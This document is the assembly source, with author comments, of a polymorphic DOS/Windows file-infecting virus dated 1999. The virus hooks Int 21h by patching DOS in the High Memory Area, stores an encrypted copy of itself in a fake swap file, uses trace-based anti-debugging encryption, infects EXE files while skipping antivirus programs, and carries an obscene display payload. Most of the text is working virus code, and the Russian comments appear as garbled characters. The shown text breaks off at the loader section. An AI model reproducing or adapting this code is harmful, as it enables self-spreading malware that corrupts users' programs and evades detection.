   DEBUG = 0   ; 1 - ¢ª«îç¨¨âì ®â« ¤®çë© à¥¦¨¬
           ; 0 - ¢ëª«îç¨âì ®â« ¤®çë© à¥¦¨¬

   ; COMMENT %
   ;
   ;   EXE.HMA-TSR.POLYMORPH. There is no much free space into HMA,
   ;   therefore virus has a swap file at the disk (C:\WINA20.386).
   ;   To hook Int 21h virus patches original DOS handler placed
   ;   into HMA too. HMA is same for all V86 machines, therefore once
   ;   installed virus is present at the all tasks.
   ;
   ;    *à®è¥« à®¢® £®¤ á® ¤ï ¢ë¯ãáª  ¬®¥£® ¯®á«¥¤¥£® ¯à®¤ãªâ ... Ž¤ ª® ¥
   ; ¤ã¬ ©â¥, çâ® ¢á¥áì £®¤ ï áâà ¤ « åã©¥© (å®âï íâ®, ª á®¦ «¥¨î, â®¦¥ ¨¬¥«®
   ; ¬¥áâ®):   ¯®¤å®¤¥ ¥é¥ ¥áª®«ìª® ¨â¥à¥áëå ¢¥é¥© (®áâ «®áì ¤®¤¥« âì ¡ãª¢ «ì®
   ; ¯ àã ¬¥«®ç¥©). ‘¥©ç á ¯¥à¥¤ ¢ ¬¨ ®ç¥à¥¤®© DOS-¢¨àãá, *Ž íâ® ¯¥à¢ë© ¬®£®-
   ; § ¤ çë©(!) DOS-¢¨àãá ¤«ï WINDOWS. ’ ª®£® ¢ë ¥é¥, ï ¤ã¬ î, ¥ ¢¨¤¥«¨. ’¥¯¥àì
   ; ¯®¤à®¡¥¥.
   ;
   ;    1. ˆá¯®«ì§ã¥âáï ®à¨£¨ «ìë© ¬¥â®¤ ¯®á ¤ª¨ ¢ ¯ ¬ïâì. Š ª ¨§¢¥áâ®, ¢ HMA
   ;       ¥áâì ¥¬®£® ¬¥áâ  - íâ® ¢®-¯¥à¢ëå. ‚®-¢â®àëå, ¢ HMA ç é¥ ¢á¥£® § £àã¦¥
   ;       DOS. ‚ âà¥âì¨å, ª®£¤  ¢ë § ªàë¢ ¥â¥ DOS-®ª® ¢ WINDOWS, HMA ¥
   ;       ¢®ááâ  ¢«¨¢ ¥âáï ¤® ¯¥à¢® ç «ì®£® ¢¨¤  (ç¥£® ¥«ì§ï áª § âì ®¡
   ;       ®áâ «ì®© ¤®áâã¯®© DOS-¯ ¬ïâ¨). ˆ,  ª®¥æ, á ¬®¥ £« ¢®¥: HMA - ®¡é ï
   ;       ¤«ï ¢á¥å § ¤ ç. „«ï ¥¯®á¢ïé¥ëå: HMA - íâ® High Memory Area (FFFF:0010-
   ;       FFFF:FFFF). *â  ®¡« áâì ¤®áâã¯    ¯à®æ¥áá®à¥ 386 ¨ ¢ëè¥, ¯à¨ç¥¬ ¤®«¦ 
   ;       ¡ëâì ®âªàëâ   ¤à¥á ï «¨¨ï A20. ‚á¥ ¢ëè¥ áª § ®¥ ¬ë ¨á¯®«ì§ã¥¬
   ;       á«¥¤ãîé¨¬ ®¡à §®¬:
   ;
   ;       a) ‚ë¤¥«ï¥¬ ¬¥áâ® ¢ HMA ¨ ª®¯¨àã¥¬ âã¤  á¯¥æ¨ «ìãî ¯®¤¯à®£à ¬¬ã Loader
   ;          (®¡ íâ®¬ ¨¦¥).
   ;
   ;       b) ˆé¥¬ ¢ HMA ®¡à ¡®âç¨ª DOS (¤«ï â¥å, ªâ® ¥ § ¥â: âã¤  ®¡ï§ â¥«ì®
   ;          ¯¥à¥¤ ¥âáï ã¯à ¢«¥¨¥ ¯à¨ ª ¦¤®¬ ¢ë§®¢¥ Int 21h). Ž  ç¨ ¥âáï â ª:
   ;
   ;              FA          cli
   ;              80 FC 73    cmp ah,73h
   ;              77 xx       ja  xx
   ;
   ;       c) ‡ ¬¥ï¥¬ "cmp ah,73h"   "call Loader". ’¥¯¥àì ¬ë ¢¨á¨¬   Int 21h.
   ;          Call - ¡«¨¦¨©, â ª ª ª ¬ë  å®¤¨¬áï ¢ ®¤®¬ á¥£¬¥â¥ á DOS - FFFF.
   ;          *¥à¥¤ ¢®§¢à â®¬ ¨§ Loader ã¦® ¢ë¯®«¨âì "cmp ah,73h" (  ¢áïª¨©
   ;          á«ãç ©).
   ;
   ;       d) ’¥¯¥àì ® Loader. ’ ª ª ª ¢ HMA ¬¥áâ  ¤®¢®«ì® ¬ «®, â® ¯à¨©¤¥âáï
   ;          ¢ ¯®¤¯à®£à ¬¬ã Loader ¯®¬¥áâ¨âì â®«ìª® ¯®¤£àã§ç¨ª ®á®¢®© ç áâ¨
   ;          ¢¨àãá , ª®â®àãî ã¦® § ¯¨á âì,  ¯à¨¬¥à, ¢ á¢®¯-ä ©«. *â  ¯à®£à ¬¬ 
   ;          ¢ë¤¥«ï¥â ¬¥áâ® ¢ ®¡ëç®© ¯ ¬ïâ¨, ª®¯¨àã¥â âã¤  ¢¨àãá ¨§ ä ©«  ¨
   ;          ¯¥à¥¤ ¥â ¥¬ã ã¯à ¢«¥¨¥. „ «¥¥, ª ª ¢ ®¡ëç®¬ ¢¨àãá¥.
   ;
   ;       ˆâ ª, â¥¯¥àì ¢¨àãá ¯¥à¥å¢ â¨« Int 21h ¨, â ª ª ª HMA ®¡é ï ¤«ï ¢á¥å
   ;       § ¤ ç, â® ¨ ¢¨àãá áãé¥áâ¢ã¥â ¢® ¢á¥å § ¤ ç å.
   ;       ‡ ¬¥ç ¨¥:   ¯à ªâ¨ª¥ ¢á¥ ¥áª®«ìª® á«®¦¥¥, â ª çâ® «ãçè¥ ¯®á¬®âà¨â¥
   ;       ¨áå®¤¨ª. *¥ª®â®àë¥ ¤¥â «¨ ¨§ ¢ëè¥®¯¨á ®£® ¤«ï ¤ ®£® ¢¨àãá :
   ;
   ;       a) ‘¢®¯-ä ©« è¨äàã¥âáï. Šà®¬¥ â®£® ª ¥¬ã ¤®¯¨áë¢ ¥âáï ¬ãá®à. ˆ¬ï
   ;          á¢®¯-ä ©« : "C:\WINA20.386" - áâ ¤ àâë©, ® ¨ª®¬ã ¥ ã¦ë© ä ©«
   ;          ®â Windows 3.11
   ;
   ;       b) *à¨ ª ¦¤®¬ ¢ë§®¢¥ f.4Bh Int 21h HMA-ç áâì ¢¨àãá  ¯à®¢¥àï¥â  «¨ç¨¥
   ;          ®á®¢®£® â¥«  ¢ ®¡ëç®© ¯ ¬ïâ¨ ¨, ¯® ¬¥à¥  ¤®¡®áâ¨, à §¬¥é ¥â
   ;          ¥£® â ¬.
   ;
   ;       c) Žá®¢®¥ â¥«® ¢¨àãá  ¢ ¯ ¬ïâ¨ â ª¦¥  å®¤¨âáï ¢ è¨äà®¢ ®¬ ¢¨¤¥,
   ;          ¨ ¢  ç «¥ áâ®¨â IRET. *¥à¥¤ ¢ë§®¢®¬ ®á®¢®£® â¥«  ¢¨àãá ¥£®
   ;          à áè¨äà®¢ë¢ ¥â,   ¯®á«¥ ®âà ¡®âª¨ § è¨äà®¢ë¢ ¥â ¥£® ¢®¢ì ¨ áâ ¢¨â
   ;          ¢  ç «® IRET.
   ;
   ;       d) €¤à¥á ®á®¢®£® â¥«  ¢¨àãá  åà ¨âáï ¢ Int 65h (å®âï ¬®¦® ¢ «î¡®¬
   ;          ¤àã£®¬ ¥¨á¯®«ì§ã¥¬®¬ ¨â¥). €¤à¥á ¥«ì§ï åà ¨âì ¢ â¥«¥ ¢¨àãá ,
   ;          çâ®¡ á¨áâ¥¬  ¥ ¯à®£«îç¨«  ¯à¨ ¯¥à¥ª«îç¥¨¨ § ¤ ç ¯®¤ WINDOWS.
   ;
   ;       e) *®á«¥ ¯¥à¥¤ ç¨ ã¯à ¢«¥¨ï ¯®¤¯à®£à ¬¬¥, ª®â®à ï  å®¤¨âáï ¢ HMA,
   ;          ãáâ  ¢«¨¢ ¥âáï § é¨â  ®â à¥ªãàá¨¨ ¯®áà¥¤áâ¢®¬ ¨§¬¥¥¨ï ®¤®© ¨§
   ;          ¯¥à¢ëå ª®¬ ¤   JMP Exit, £¤¥ Exit ãª §ë¢ ¥â   ª®¥æ  è¥©
   ;          ¯®¤¯à®£à ¬¬ë.
   ;
   ;    2. ‚¨àãá âà¨¦¤ë è¨äà®¢ .
   ;
   ;       a) *¥à¢ ï ¯à®æ¥¤ãà  è¨äà®¢ª¨ - ¯®«¨¬®àä  ¨ ¨¬¥¥â ¯¥à¥¬¥ãî ¤«¨ã.
   ;          ˆá¯®«ì§ãîâáï: ¨§¬¥¥¨¥ à¥£¨áâà®¢ ¨ ¬ãá®àë¥ ª®¬ ¤ë. ƒ¥¥à â®à
   ;          ¬ãá®àëå ª®¬ ¤ á®§¤ ¥â:
   ;           * 1-¡ ©âë¥ ª®¬ ¤ë (  â ª¦¥ ¯à¥ä¨ªáë á¥£¬¥â®¢) ¢ë¡®à®¬ ¨§ á¯¨áª ;
   ;           * 2-,3-,4-¡ ©âë¥ ª®¬ ¤ë ¢¨¤  COMMAND R/M,REG ¯ãâ¥¬ ¯®«ãç¥¨ï
   ;             á«ãç ©®£® ç¨á«  ¨§ ¯®àâ  â ©¬¥à  á ¯®á«¥¤ãîé¨¬   «¨§®¬ ¥£®
   ;             ¡¨â®¢ ¨ ¤®¡ ¢«¥¨¥¬ (¥á«¨ ã¦®) ç¨á«®¢ëå ®¯¥à ¤®¢.
   ;          *â® ¬®© ¯¥à¢ë© ¯®«¨¬®àä¨ª, â ª çâ® ¥ áã¤¨â¥ áâà®£®.
   ;
   ;       b) ‚â®à ï ¯à®æ¥¤ãà  è¨äà®¢ª¨ ¨á¯®«ì§ã¥â  â¨í¢à¨áâ¨ç¥áª¨©  «£®à¨â¬,
   ;          ª®â®àë©, ¯® ¬®¨¬ ¤ ë¬, ¥é¥ ¨£¤¥ ¥ ¨á¯®«ì§®¢ «áï: ¢¨àãá ®âªàë¢ ¥â
   ;          ä ©«-®á¨â¥«ì ¨ áç¨âë¢ ¥â ¯®á«¥¤¨¥ ¤¢  ¡ ©â  (íâ® ª«îç à áè¨äà®¢ª¨).
   ;          ‡ â¥¬ ¢¨àãá áâ ¤ àâ® à áè¨äà®¢ë¢ ¥â ®áâ «ìãî ç áâì ª®¤ , ¯®á«¥
   ;          ç¥£® ¯à®¢¥àï¥â, ã¤ ç® «¨ ¯à®è«  à áè¨äà®¢ª . ‚ á«ãç ¥ ®è¨¡ª¨ ¢ë¢®¤¨â
   ;            íªà  á®®¡é¥¨¥ ¨ § ¢¥àè ¥â ¢ë¯®«¥¨¥ ¯à®£à ¬¬ë.
   ;
   ;       c) ‚â®à ï ¯à®æ¥¤ãà  è¨äà®¢ª¨ á ¬  ç áâ¨ç® § è¨äà®¢  . ’ãâ ¯à¨¬¥ï¥âáï
   ;          ¤®¢®«ì® ®à¨£¨ «ìë©  «£®à¨â¬, ª®â®àë© ï à ìè¥ ¨£¤¥ ¥ ¢áâà¥ç «,  
   ;          ¨¬¥® - ¤¨ ¬¨ç¥áª ï è¨äà®¢ª /à áè¨äà®¢ª . Ž  à¥ «¨§®¢   á«¥¤ãîé¨¬
   ;          ®¡à §®¬: á ç «  ãáâ  ¢«¨¢ ¥âáï ®¡à ¡®âç¨ª Int 1, ª®â®àë© è¨äàã¥â
   ;          ®¤¨¬ ª«îç¥¬ ª®¬ ¤ã, ª®â®à ï ¢ë¯®«¨« áì ¤® ¥£® ¢ë§®¢ ,   § â¥¬
   ;          à áè¨äà®¢ë¢ ¥â ¤àã£¨¬ ª«îç¥¬ ª®¬ ¤ã, ª®â®à ï ¤®«¦  ¢ë¯®«¨âìáï
   ;          ¯®á«¥. *®á«¥ ãáâ ®¢ª¨ ®¡à ¡®âç¨ª  ¢ª«îç ¥âáï âà áá¨à®¢ª , ¨
   ;          ¢ë¯®«ï¥âáï ¥ª®â®àë© ãç áâ®ª ª®¤ . ‡ â¥¬ âà áá¨à®¢ª  ¢ëª«îç ¥âáï.
   ;          ‚ à¥§ã«ìâ â¥ íâ®â ãç áâ®ª ª®¤  áâ ®¢¨âáï § è¨äà®¢ ë¬ ã¦¥ ¤àã£¨¬
   ;          ª«îç¥¬. *â®â  «£®à¨â¬ á®¤¥à¦¨â ¡®«ìè®¥ ª®«¨ç¥áâ¢® î á®¢ ¨, ¢¨¤¨¬®
   ;          ¯®íâ®¬ã, ¨£¤¥(?) ¥ à¥ «¨§®¢ . ‚®â ¥ª®â®àë¥ ¬®¬¥âë:
   ;           * *®á«¥ ¥ª®â®àëå ª®¬ ¤ ¢á¥ ¯à¥àë¢ ¨ï (¢ â®¬ ç¨á«¥ ¨ Int 1)
   ;             § ¯à¥é îâáï, ¯®íâ®¬ã ª®¬ ¤ë, áâ®ïé¨¥ á«¥¤®¬ §  ¨¬¨, ®áâ îâáï
   ;             ¥è¨äà®¢ ë¬¨.
   ;           * ˜¨äàã¥âáï â®«ìª® ®¤¨ ¡ ©â ª ¦¤®© ª®¬ ¤ë, â.ª. ®¯à¥¤¥«¨âì ¤«¨ã
   ;             ª®¬ ¤ë ¤®áâ â®ç® á«®¦®.
   ;           * „ ë©  «£®à¨â¬ ¥«ì§ï ¯à¨¬¥ïâì, ¥á«¨ è¨äàã¥¬ë© ª®¤ á®¤¥à¦¨â
   ;             ãç áâª¨, ¢ë¯®«ïîé¨¥áï ¥®¤®ªà â® (¯®¤¯à®£à ¬¬ë, æ¨ª«ë). *â®
   ;             ¬®¦® ¨á¯à ¢¨âì, ® â®£¤  ª®¤ ¤®«¦¥ è¨äà®¢ âìáï ®¤¨¬ ¨ â¥¬ ¦¥
   ;             ª«îç¥¬.
   ;           * *ã¦® ¯à®¢¥àïâì á¥£¬¥â è¨äàã¥¬®© ª®¬ ¤ë, çâ®¡ á«ãç ©® ¥
   ;             § è¨äà®¢ âì ®¡à ¡®âç¨ª â®£® ¯à¥àë¢ ¨ï, ª®â®à®¥ ¬®¦¥â ¢®§¨ªãâì
   ;             ¢ ¯à®æ¥áá¥ ¢ë¯®«¥¨ï ª®¤ .
   ;           * *ã¦® ãç¨âë¢ âì, çâ® ¯¥à¢ë© à § Int 1 ¢ë§ë¢ ¥âáï â®«ìª® ¯®á«¥
   ;             ª®¬ ¤ë, á«¥¤ãîé¥© §  ª®¬ ¤®© ¢ª«îç¥¨ï âà áá¨à®¢ª¨, ¨ ã¦¥ ¥
   ;             ¢ë§ë¢ ¥âáï ¯®á«¥ ª®¬ ¤ë ¢ëª«îç¥¨ï âà áá¨à®¢ª¨.
   ;          „ ë©  «£®à¨â¬ ¯®ª § « á¢®î íää¥ªâ¨¢®áâì ¢ ¯« ¥ ®¡« ¬ë¢ ¨ï ¢á¥å
   ;          ¨¬¥îé¨åáï ã ¬¥ï ®â« ¤ç¨ª®¢ (¢à®¤¥ ¡ë ¤ ¦¥ WinIce 4.0).
   ;
   ;    3. ‡ à ¦¥¨¥ ä ©«®¢.
   ;
   ;       a) ‚¨àãá áâ ¤ àâ® § à ¦ ¥â MZ-EXE ä ©«ë ¯à¨ § ¯ãáª¥, ¤®¯¨áë¢ ïáì
   ;          ¢ ª®¥æ.
   ;       b) *à®¢¥àª  â¨¯  ä ©«  ¯à®¨áå®¤¨â ª ª ¯® à áè¨à¥¨î, â ª ¨ ¯® ¯¥à¢ë¬
   ;          ¤¢ã¬ ¡ ©â ¬ ä ©« .
   ;       c) *®á«¥ § à ¦¥¨ï ä ©« áâ ®¢¨âáï ®¢¥à«¥©ë¬ (¢ ª®æ¥  å®¤¨âáï ª«îç
   ;          ¤«ï à áè¨äà®¢ª¨). ’ ª ª ª ¢¨àãá ¥ âà®£ ¥â ®¢¥à«¥©ë¥ ä ©«ë, â®
   ;          ¯®¢â®à®£® § à ¦¥¨ï ¯à®¨§®©â¨ ¥ ¬®¦¥â.
   ;       d) *¥ § à ¦ ¥â ¥ª®â®àë¥  â¨¢¨àãáë (DR*,AD*,AV*,TB*).
   ;       e) *¥ ¯®àâ¨â NewEXE (NE,PE,LE,LX) - ¤«ï ¨å á¤¥«   á¯¥æ¨ «ì ï ¯à®¢¥àª .
   ;       f) Ž¡à ¡ âë¢ ¥â  âà¨¡ãâ "’®«ìª® çâ¥¨¥". *¥ ¨§¬¥ï¥â  âà¨¡ãâë ¨ ¢à¥¬ï
   ;          á®§¤ ¨ï ä ©« .
   ;       g) …áâì § £«ãèª    Int 24h. *¥ £«îç¨â   § é¨é¥ëå ®â § ¯¨á¨ ¤¨áª¥â å.
   ;       h) * §®¢ ï ¤«¨  ¢¨àãá  (¡¥§ ¯®«¨¬®àä®£® à áè¨äà®¢é¨ª ) - 2400 ¡ ©â .
   ;          *®á«¥ § à ¦¥¨ï à §¬¥à ä ©«  ã¢¥«¨ç¨¢ ¥âáï ¢ áà¥¤¥¬   2500 ¡ ©â.
   ;       i) …áâì à¥¦¨¬ ®â« ¤ª¨, ¯à¨ ª®â®à®¬ ¢¨àãá § à ¦ ¥â â®«ìª® ä ©«ë, ¨¬¥ 
   ;          ª®â®àëå  ç¨ îâáï   "ZZ". „«ï ¢ª«îç¥¨ï íâ®£® à¥¦¨¬   ¤® ãáâ ®¢¨âì
   ;          DEBUG=1 (¯® ã¬®«ç ¨î - 0).
   ;
   ;    4. ‚¨àãá á®¤¥à¦¨â ¯à¨ª®«ìãî ¤¥¬ªã, ª®â®à ï  ªâ¨¢¨§¨àã¥âáï ¯à¨ § à ¦¥¨¨
   ;       ª ¦¤®£® 256-£® ä ©« . Šà âª®¥ ®¯¨á ¨¥ ¤¥¬ª¨: ¢¨§ã íªà   ¨§ áâ®à®ë
   ;       ¢ áâ®à®ã ¥§¤¨â â¥«¥¦ª . *  â¥«¥¦ª¥ áâ®¨â åã©, ª®â®àë© ¡àë§£ ¥â á¯¥à¬®©.
   ;       ˆ§ á¯¥à¬ë ¢ëª« ¤ë¢ ¥âáï  ¤¯¨áì: "‚‹€‘Ž‚ - *ˆ„Ž*".
   ;       ‹¨à¨ç¥áª®¥ ®âáâã¯«¥¨¥: ‚« á®¢ - ¯à¥¯®¤ ¯® ¨ä®à¬ â¨ª¥. *â® ç¥«®¢¥ª,
   ;       ª®â®àë© ¨åãï ¥ § ¥â, ® ¯à¨ íâ®¬ ®¡« ¤ ¥â ¯à®áâ® ä â áâ¨ç¥áª¨¬
   ;       á ¬®¬¥¨¥¬.
   ;
   ; ˆ’Žƒ: Œ®£®§ ¤ çë© ¯®«¨¬®àäë© MZ-EXE ¢¨àãá, ¯®«®áâìî á®¢¬¥áâ¨¬ë© á WINDOWS
   ;       ¨ á®§¤ ë© á¯¥æ¨ «ì® ¤«ï WINDOWS. *¥ ¤¥â¥ªâ¨àã¥âáï (¯®ª ) ¨ª ª¨¬¨
   ;        â¨¢¨àãá ¬¨. ‘®¤¥à¦¨â ¯à¨ª®«ìãî £à ä¨ç¥áªãî ¤¥¬ªã. Œ®£®ç¨á«¥ë¥
   ;       ¨á¯ëâ ¨ï ¤®ª § «¨ ¥£® à ¡®â®á¯®á®¡®áâì ¨ ®âáãâáâ¢¨¥ £«îª®¢   ¬®¬¥â
   ;       ¢ë¯ãáª  ¢ á¢¥â.
   ;
   ;                                   DJ Sadovnikov (http://i.am/djsad), 18.11.1999
   ;
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;              Š®¬¯¨«¨à®¢ âì á ¯®¬®éìî TASM 4.1+
   ;
   ;                 tasm /m vlasov.asm
   ;                 tlink /x vlasov.obj
   ;                 del vlasov.obj
   ;
   ;
   ;              ” ©«ë ¨§  àå¨¢ :
   ;
   ;                 vlasov.asm  34000 (¨áå®¤¨ª ¢¨àãá )
   ;                 vlasov.exe   2945 (¡¨ à¨ª ¢¨àãá )
   ;                 vlasov.com    777 (¤¥¬ª  ®â¤¥«ì®)
   ;                 vlasov.doc   4500 (â¥å¨ç¥áª ï ¨ä®à¬ æ¨ï)
   ; %
   ;
   ;
   ;
   ;
   ;
   ;
   ;



   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           .286
   Code        segment
           assume  cs:Code, ds:Code

   Start:      mov ah, 9
           mov dx, offset Msg+100h
           int 21h
           mov ax, 4C00h
           int 21h

   Msg     db  'Virus has started...$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               *€—€‹Ž ‚ˆ*“‘€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Virus:      pusha
           push    ds es


   ;[‚ëç¨á«ï¥¬ â®çªã ¢å®¤  ¢ ¢¨àãá]

           call    GetIP
   GetIP:      pop si
           sub si, GetIP-Virus


   ;[“áâ  ¢«¨¢ ¥¬ ®¡à ¡®âç¨ª âà áá¨à®¢ª¨]

           mov ax, 2501h
           lea dx, [Int01h-Virus+si]
           push    cs
           pop ds
           int 21h


   ;[“áâ  ¢«¨¢ ¥¬  ç «ìë¥ § ç¥¨ï ¤«ï à áè¨äà®¢ª¨]

           lea ax, [BegCr-Virus+si]
           mov ds:[PrevOfs+1-Virus+si], ax
           mov ds:[PrevSeg+2-Virus+si], cs

           mov al, ds:[PrevXor+3-Virus+si]
           mov ds:[NextXor+3-Virus+si], al
           xor ds:[BegCr-Virus+si], al
           xor ds:[EndCr-Virus+si], al
           in  al, 40h
           mov ds:[PrevXor+3-Virus+si], al


   ;[DS = Environment segment]

           push    es:[2Ch]
           pop ds


   ;[ˆé¥¬ ¨¬ï ä ©« -®á¨â¥«ï]

           mov di, 4
   Loop00:     cmp ds:[di-4], word ptr 0000
           jne L3
           cmp ds:[di-2], word ptr 0001
           je  Found1
   L3:     inc di
           jmp Loop00


   ;[‚ª«îç ¥¬ âà áá¨à®¢ªã]

   Found1:     pushf
           pop ax
           or  ah, 00000001b
           push    ax
           popf
   BegCr:


   ;[Žâªàë¢ ¥¬ ä ©«-®á¨â¥«ì]

           mov ax, 3D00h
           mov dx, di
           int 21h
           xchg    bx, ax


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   ¤¢  ¡ ©â  ®â ª®æ  ä ©« ]

           mov ax, 4202h
           mov cx, 0FFFFh
           mov dx, 0FFFEh
           int 21h


   ;[‘ç¨âë¢ ¥¬ ¯®á«¥¤¨¥ ¤¢  ¡ ©â  ä ©« ]

           mov ah, 3Fh
           mov cx, 2
           lea dx, [Key1-Virus+si]
           push    cs
           pop ds
           int 21h


   ;[‡ ªàë¢ ¥¬ ä ©«-®á¨â¥«ì]

           mov ah, 3Eh
           int 21h


   ;[‚ëª«îç ¥¬ âà áá¨à®¢ªã]

           pushf
           pop ax
           and ah, 11111110b
           push    ax
           popf
   EndCr:


   ;[* áè¨äà®¢ë¢ ¥¬ ¢¨àãá]

   Key1        equ $+1
           mov ax, 0
           mov bx, Crypt-Virus
   Loop01:     add ds:[bx+si], al
           add al, ah
           inc bx
           cmp bx, CodeSize
           jne Loop01


   ;[*à®¢¥àï¥¬ ¯à ¢¨«ì®áâì à áè¨äà®¢ª¨]

           cmp ds:[Crypt-Virus+si], 01B8h
           je  Crypt

           mov ah, 9
           lea dx, [Modified-Virus+si]
           int 21h

           mov ax, 4CFFh
           int 21h

   Modified    db  'Program is modified! Exiting...$'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int01h:     pusha
           mov bp, sp
           mov cx, cs


   ;[*®«ãç ¥¬ â®çªã ¢å®¤  ¢ Int 01h]

           call    Int1
   Int1:       pop si


   ;[…á«¨ ¯à¥¤ë¤ãé ï ª®¬ ¤   å®¤¨âáï ¢  è¥¬ á¥£¬¥â¥ - è¨äàã¥¬ ¥¥]

   PrevSeg:    cmp cx, 1234h
           jne L1
   PrevOfs:    mov bx, 1234h
   PrevXor:    xor cs:[bx], byte ptr 0


   ;[…á«¨ á«¥¤ãîé ï ª®¬ ¤   å®¤¨âáï ¢  è¥¬ á¥£¬¥â¥ - à áè¨äà®ë¢ ¥¬ ¥¥]

   L1:     cmp cx, [bp+18]
           jne L2
           mov bx, [bp+16]
   NextXor:    xor cs:[bx], byte ptr 0


   ;[‘®åà ï¥¬  ¤à¥á á«¥¤ãîé¥© ª®¬ ¤ë]

   L2:     mov ax, [bp+18]
           mov cs:[PrevSeg+2-Int1+si], ax
           mov ax, [bp+16]
           mov cs:[PrevOfs+1-Int1+si], ax

           popa
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[*à®¢¥àï¥¬, ¥áâì «¨ ¢ HMA ¬¥áâ® ¤«ï LOADER' ]

   Crypt:      mov ax, 4A01h
           int 2Fh
           cmp bx, LoaderSize
           jae MemOk
           jmp Quit1

   MemOk:      push    es
           pop ds


   ;[ˆé¥¬ ¢ HMA  ç «® ®¡à ¡®âç¨ª  Int21h]

           mov di, 4
   Loop02:     cmp ds:[di-4], 80FAh
           jne L4
           cmp ds:[di-2], 73FCh
           jne L4
           cmp ds:[di], byte ptr 77h
           je  Found2
   L4:     inc di
           jnz Loop02
           jmp Quit1
   Found2:     push    di


   ;[‡ ¯®¬¨ ¥¬ ª«îç ¤«ï § è¨äà®¢ª¨ ¢¨àãá  ¢ ¯ ¬ïâ¨]

           push    cs
           pop ds
           in  al, 40h
           mov ds:[Key2-Virus+si], al


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï LOADER'  ¢ HMA]

           mov ax, 4A02h
           mov bx, LoaderSize
           int 2Fh
           push    di


   ;[Š®¯¨àã¥¬ LOADER ¢ ¢ë¤¥«¥ãî ¯ ¬ïâì]

           push    si
           mov cx, LoaderSize
           add si, Loader-Virus
           cld
           rep movsb
           pop si


   ;[„¥« ¥¬ á¯« ©á¨£ ¢  ç «® ®¡à ¡®âç¨ª ]

           pop ax
           pop bx
           sub ax, bx
           cli
           mov es:[bx-3], byte ptr 0E8h
           mov es:[bx-2], ax
           sti


   ;[‘®§¤ ¥¬ SWAP-ä ©«]

           mov ah, 3Ch
           xor cx, cx
           lea dx, [SwapName-Virus+si]
           int 21h
           jc  Quit1
           xchg    ax, bx


   ;[˜¨äàã¥¬ ¢¨àãá ¨ § ¯¨áë¢ ¥¬ ¥£® ¢ SWAP-ä ©«]

           xor di, di
   Loop03:     xchg    bx, di
           mov al, ds:[si+bx]
           xor al, ds:[Key2-Virus+si]
           mov ds:[OneByte-Virus+si], al
           xchg    di, bx

           mov cx, 1
           lea dx, [OneByte-Virus+si]
           call    Write
           jc  Close2

           inc di
           cmp di, CodeSize
           jne Loop03


   ;[„®¯¨áë¢ ¥¬ ¢ SWAP ¬ãá®à]

           in  ax, 40h
           mov ds, ax
           mov cx, ax
           mov dx, ax
           mov ah, 40h
           int 21h


   ;[‡ ªàë¢ ¥¬ SWAP-ä ©«]

   Close2:     mov ah, 3Eh
           int 21h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥ § à ¦¥®© ¯à®£à ¬¬¥]

   Quit1:      pop es ds

           mov ax, es
           add ax, 10h
           add cs:[OldCS-Virus+si], ax
           add cs:[OldSS+1-Virus+si], ax
           popa
           jmp $+2

           cli
   OldSS:      mov sp, 0
           mov ss, sp
   OldSP:      mov sp, 0
           sti

           db  0EAh
   OldIP       dw  0
   OldCS       dw  0

   OneByte     db  0

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               HMA-LOADER
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

